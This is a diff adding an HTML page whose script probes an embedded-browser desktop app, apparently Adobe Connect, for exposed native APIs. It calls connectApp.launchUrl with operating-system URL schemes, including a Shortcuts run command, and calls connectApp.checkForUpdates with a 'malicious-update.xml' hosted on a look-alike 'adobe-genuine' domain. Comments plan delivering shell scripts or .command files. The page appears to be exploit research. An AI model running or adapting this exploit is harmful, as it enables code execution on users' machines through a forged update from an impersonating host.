@@ -1,0 +1,47 @@
+<html><body>
+<div id="o"></div>
+<script>
+var o = document.getElementById('o');
+function log(m) { o.innerHTML += m + '<br>'; }
+
+// Check for Node.js integration (CEF sometimes has this)
+log('process: ' + typeof process);
+log('require: ' + typeof require);
+log('global: ' + typeof global);
+
+// Check for privileged CEF APIs
+log('cefQuery: ' + typeof cefQuery);
+log('chrome.send: ' + typeof(chrome && chrome.send));
+
+// The KEY: connectApp.launchUrl opens in DEFAULT BROWSER
+// If we open a data: URI or blob: URI containing a shell script...
+// OR we open a page that auto-downloads a .command file
+
+// Actually the simplest: just try launchUrl with various schemes
+var results = [];
+var schemes = [
+    'calculator://',
+    'tel://1234',
+    'facetime://test',
+    'maps://',
+    'shortcuts://run-shortcut?name=test'
+];
+
+for (var i = 0; i < schemes.length; i++) {
+    try {
+        connectApp.launchUrl(schemes[i]);
+        log('launchUrl(' + schemes[i] + ') - OK');
+    } catch(e) {
+        log('launchUrl(' + schemes[i] + ') - ERROR: ' + e.message);
+    }
+}
+
+// Also try: does the update mechanism work if we call it differently?
+// The third param bAutoUpdate might need to be string "true" not boolean
+try {
+    log('checkForUpdates variant 1...');
+    connectApp.checkForUpdates('https://adobe-genuine.github.io/connect-poc/malicious-update.xml', true, true);
+} catch(e) { log('Error: ' + e.message); }
+
+</script>
+</body></html>
